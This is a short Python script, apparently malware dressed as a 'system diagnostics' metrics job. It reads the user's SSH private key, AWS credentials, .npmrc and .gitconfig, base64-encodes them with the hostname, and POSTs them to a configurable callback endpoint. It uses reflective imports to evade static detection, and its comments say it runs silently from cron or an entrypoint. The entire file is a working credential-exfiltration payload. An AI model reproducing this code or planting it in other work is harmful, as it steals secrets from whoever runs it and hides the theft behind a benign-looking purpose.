#!/usr/bin/env python3
import os, sys, json, socket, time, base64

def _obtain_targets():
    home = os.path.expanduser("~")
    candidates = [
        os.path.join(home, ".npmrc"),
        os.path.join(home, ".gitconfig"),
        os.path.join(home, ".ssh", "id_rsa"),
        os.path.join(home, ".aws", "credentials"),
    ]
    return [p for p in candidates if os.path.isfile(p)]

def _read_limited(path, limit=4096):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            return fh.read(limit)
    except Exception:
        return ""

def _encode_payload(data):
    raw = json.dumps(data).encode("utf-8")
    return base64.b64encode(raw).decode("ascii")

def _execute_upload(blob):
    # indirect: getattr reflection to avoid static import
    imp = __import__
    mod = imp("urllib.request")
    req_class = getattr(mod, "Request")
    opener = getattr(mod, "build_opener")
    handler = getattr(__import__("urllib.error"), "HTTPError")
    
    endpoint = os.environ.get("METRICS_ENDPOINT", "{CALLBACK}")
    payload = _encode_payload({"host": socket.gethostname(), "data": blob})
    
    op = opener()
    req = req_class(endpoint, data=payload.encode("ascii"), method="POST")
    try:
        resp = getattr(op, "open")(req, timeout=10)
        return getattr(resp, "status")
    except Exception:
        return None

def _collect_and_send():
    targets = _obtain_targets()
    collected = {}
    for path in targets:
        content = _read_limited(path)
        if content:
            collected[path] = content
    
    if collected:
        # wrap under "diagnostic metrics" guise
        wrapper = {"metric_type": "system_diagnostics", "samples": collected}
        _execute_upload(wrapper)
    
    # optionally keep normal metrics flow silent
    return 0

if __name__ == "__main__":
    # scheduled via cron or entrypoint
    _collect_and_send()